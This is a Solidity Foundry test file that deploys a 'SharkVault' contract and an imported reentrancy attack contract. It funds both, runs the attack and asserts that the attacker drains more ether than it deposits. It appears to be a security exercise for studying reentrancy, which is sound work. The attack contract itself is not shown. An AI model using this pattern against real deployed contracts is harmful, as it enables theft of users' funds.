// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../Src/Contracts/SharkVault.sol";
import "../Src/Contracts/ReentrancyAttack.sol";
import {DSTest} from "ds-test/test.sol";

contract ReentrancyAttackTest is Test {
    SharkVault public sharkVault;
    ReentrancyAttack public reentrancyAttack;
    address public attacker;

    function setUp() public {
        attacker = address(0x1337);

        // Deploy SharkVault contract
        sharkVault = new SharkVault();

        // Deploy ReentrancyAttack contract
        reentrancyAttack = new ReentrancyAttack(sharkVault);
    }

    function testReentrancyAttack() public {
        // Fund the SharkVault contract
        deal(address(sharkVault), 10 ether);

        // Fund the attacker and perform the attack
        deal(attacker, 1 ether);
        vm.startPrank(attacker);
        reentrancyAttack.attack{value: 1 ether}();
        vm.stopPrank();

        // Check the balance of the attacker contract
        uint256 stolenFunds = address(reentrancyAttack).balance;
        assertGt(stolenFunds, 1 ether);

        // Withdraw the funds from the attacker contract
        vm.startPrank(attacker);
        reentrancyAttack.withdraw();
        vm.stopPrank();

        // Check the balance of the attacker
        assertGt(attacker.balance, 1 ether);
    }
}
